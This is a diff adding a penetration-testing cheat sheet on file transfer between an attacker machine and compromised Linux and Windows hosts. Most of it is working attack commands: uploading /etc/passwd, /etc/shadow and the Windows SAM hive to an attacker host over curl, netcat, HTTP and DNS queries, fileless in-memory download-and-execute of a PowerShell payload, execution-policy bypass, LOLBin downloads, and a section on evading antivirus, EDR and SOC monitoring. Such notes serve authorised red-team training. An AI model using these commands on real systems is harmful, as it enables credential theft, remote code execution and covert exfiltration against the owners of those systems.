@@ -1,0 +1,224 @@
+# File Transfers
+
+Moving files between your attacker machine and a target is a core skill. The right method depends on what is available: HTTP, SMB, DNS, or just the shell session itself.
+
+## Hosting Files (Attacker Side)
+
+Before pulling anything to a target, you need to serve it. These are the fastest ways to spin up a file server on your attacker machine.
+
+```bash
+# Python HTTP (simplest, works everywhere)
+python3 -m http.server 8080
+
+# PHP HTTP (alternative when Python is missing)
+php -S 0.0.0.0:8080
+
+# Python HTTPS with a self-signed cert (bypasses targets that block plain HTTP)
+openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 1 -out server.crt -subj "/CN=attacker"
+python3 -c "
+import ssl, http.server
+ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+ctx.load_cert_chain('server.crt', 'server.key')
+httpd = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
+httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
+httpd.serve_forever()
+"
+
+# impacket SMB server (serves current directory as share named 'share')
+impacket-smbserver share . -smb2support
+
+# impacket SMB server with auth (required by newer Windows defaults)
+impacket-smbserver share . -smb2support -username user -password pass
+
+# Netcat: push a single file to a waiting receiver (no server needed)
+nc -lvnp 443 < file.exe          # attacker listens and streams the file out
+```
+
+## Linux: Downloading Files
+
+Standard download methods available on most Linux targets. `wget` and `curl` are almost always present; the others are fallbacks when standard tools are stripped.
+
+```bash
+# wget
+wget http://<ip>:8080/file -O /tmp/file
+
+# curl
+curl http://<ip>:8080/file -o /tmp/file
+
+# curl over HTTPS with self-signed cert (-k skips certificate verification)
+curl -k https://<ip>/file -o /tmp/file
+
+# curl/wget through a SOCKS proxy (e.g., after setting up a Ligolo/Chisel tunnel)
+curl --proxy socks5://127.0.0.1:1080 http://<ip>/file -o /tmp/file
+wget -e use_proxy=yes -e socks_proxy=socks5://127.0.0.1:1080 http://<ip>/file -O /tmp/file
+
+# bash /dev/tcp (no external tools required, works on any bash host)
+bash -c 'cat < /dev/tcp/<ip>/443 > /tmp/file'
+
+# Python (when wget/curl are absent)
+python3 -c "import urllib.request; urllib.request.urlretrieve('http://<ip>:8080/file', '/tmp/file')"
+
+# SCP (when you have SSH access to the target)
+scp user@<target>:/remote/path/file .          # pull from target to attacker
+scp /local/file user@<target>:/tmp/file        # push from attacker to target
+
+# Netcat receive (attacker: nc -lvnp 443 < file.exe)
+nc <ip> 443 > /tmp/file
+```
+
+## Linux: Uploading Files
+
+Methods to push files from a compromised Linux host back to your attacker machine for exfiltration or analysis.
+
+```bash
+# curl POST multipart upload (attacker needs uploadserver or a handler)
+curl -X POST http://<ip>:8080/upload -F "file=@/etc/passwd"
+
+# Python uploadserver (run on attacker: pip3 install uploadserver, then:)
+python3 -m uploadserver 8080
+# then from target:
+curl -X POST http://<ip>:8080/upload -F "files=@/etc/shadow"
+
+# SCP push back to attacker
+scp /etc/passwd kanyo@<attacker_ip>:/tmp/loot/
+
+# Netcat push (attacker: nc -lvnp 443 > received_file)
+cat /etc/passwd | nc <attacker_ip> 443
+```
+
+## Windows: Downloading Files
+
+PowerShell and built-in Windows binaries (LOLBins) cover most scenarios. Prefer PowerShell methods; fall back to certutil or bitsadmin when PowerShell is restricted.
+
+```powershell
+# Invoke-WebRequest (PowerShell 3+)
+Invoke-WebRequest http://<ip>:8080/file.exe -OutFile C:\Windows\Temp\file.exe
+
+# WebClient DownloadFile (compatible with older PowerShell versions)
+(New-Object Net.WebClient).DownloadFile('http://<ip>:8080/file.exe', 'C:\Windows\Temp\file.exe')
+
+# Fileless execution: download and run a PS1 script entirely in memory (nothing written to disk)
+IEX (New-Object Net.WebClient).DownloadString('http://<ip>:8080/payload.ps1')
+
+# Invoke-WebRequest with Chrome User-Agent (bypasses basic agent filtering on web servers)
+Invoke-WebRequest http://<ip>/nc.exe `
+  -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome `
+  -OutFile C:\Windows\Temp\nc.exe
+
+# Bypass execution policy for the current session before running scripts
+Set-ExecutionPolicy Bypass -Scope Process -Force
+
+# From cmd or a non-interactive shell
+powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('http://<ip>/file.exe','C:\Temp\file.exe')"
+```
+
+```cmd
+:: certutil (LOLBin, available on all modern Windows)
+certutil.exe -urlcache -split -f http://<ip>:8080/file.exe C:\Windows\Temp\file.exe
+
+:: bitsadmin (runs as a background transfer job)
+bitsadmin /transfer job /download /priority high http://<ip>:8080/file.exe C:\Windows\Temp\file.exe
+
+:: SMB copy from impacket-smbserver (attacker: impacket-smbserver share . -smb2support)
+copy \\<attacker_ip>\share\file.exe C:\Windows\Temp\file.exe
+
+:: SMB with auth (attacker: impacket-smbserver share . -smb2support -username user -password pass)
+net use \\<attacker_ip>\share /user:user pass
+copy \\<attacker_ip>\share\file.exe C:\Windows\Temp\file.exe
+```
+
+## Windows: Uploading Files
+
+Methods to push files from a compromised Windows host back to the attacker for exfiltration.
+
+```powershell
+# Base64-encode a file and POST it (no special server needed, just a listener)
+$bytes = [IO.File]::ReadAllBytes("C:\Windows\system32\sam")
+$b64 = [Convert]::ToBase64String($bytes)
+Invoke-WebRequest -Uri http://<attacker_ip>:8080/ -Method POST -Body $b64
+
+# SMB copy back to attacker share (impacket-smbserver on attacker)
+copy C:\Windows\Temp\loot.txt \\<attacker_ip>\share\loot.txt
+```
+
+```cmd
+:: Netcat push (attacker: nc -lvnp 443 > received_file)
+.\nc.exe <attacker_ip> 443 < C:\Windows\Temp\file.exe
+```
+
+## Base64 Transfer (When HTTP is Blocked)
+
+When no HTTP or SMB path exists, encode the file as base64 and paste it directly through the shell session. This works over any interactive shell, including RDP clipboard and reverse shells.
+
+```bash
+# Linux: encode a file to base64 (no line wrapping so you can paste in one shot)
+base64 -w 0 /path/to/file && echo
+
+# Linux: decode back to file
+echo '<base64_string>' | base64 -d > /tmp/file
+
+# Verify integrity after transfer
+md5sum /path/to/original/file
+md5sum /tmp/file
+```
+
+```powershell
+# Windows: encode a file to base64
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Windows\Temp\file.exe"))
+
+# Windows: decode base64 back to binary file
+[IO.File]::WriteAllBytes("C:\Windows\Temp\file.exe", [Convert]::FromBase64String("<base64_string>"))
+
+# Verify integrity after transfer
+Get-FileHash C:\Windows\Temp\file.exe -Algorithm MD5
+```
+
+## File Transfer over DNS (Exfil)
+
+Use DNS only when every other channel is blocked. It is slow and generates unusual query volume, so use it as a last resort.
+
+```bash
+# dnscat2: full bidirectional tunnel over DNS (run server on attacker first)
+# Attacker:
+ruby dnscat2.rb --dns "domain=<your_domain>,host=0.0.0.0" --no-cache
+
+# Target (Linux):
+./dnscat2 <your_domain>
+
+# Target (Windows):
+.\dnscat2.ps1 -Domain <your_domain>
+```
+
+```bash
+# Manual DNS exfil: chunk a file and send each chunk as a subdomain query (slow, noisy)
+# Each nslookup sends 16 bytes as a hex subdomain to your controlled domain
+for chunk in $(xxd -p -c 16 /etc/passwd); do
+  nslookup "$chunk.<attacker_domain>" > /dev/null 2>&1
+done
+# Capture queries on attacker with: tcpdump -i eth0 udp port 53
+```
+
+## Evading Detection
+
+Simple steps that make file transfers blend in or avoid leaving artifacts that AV and EDR flag.
+
+```bash
+# Rename extension before transfer; rename on target after download
+# Attacker: mv shell.exe shell.txt
+# Target: mv shell.txt shell.exe (or: copy shell.txt shell.exe)
+
+# Serve over 443 to blend with HTTPS traffic (even plain HTTP on 443 helps bypass port-level filters)
+python3 -m http.server 443
+
+# Serve with a real HTTPS cert (avoids DPI alerts on plaintext)
+# Use the Python HTTPS snippet from the 'Hosting Files' section above
+
+# Fileless execution: never writes to disk, avoids file-based AV scanning
+IEX (New-Object Net.WebClient).DownloadString('http://<ip>/payload.ps1')
+
+# Use LOLBins (certutil, bitsadmin, mshta, regsvr32) instead of dropping known tools
+# These are signed Microsoft binaries and less likely to trigger hash-based detections
+
+# Transfer on uncommon but plausible ports: 443, 8443, 8080, 53
+# Avoid 4444, 1234 and other default reverse shell ports that SOC teams watch
+```
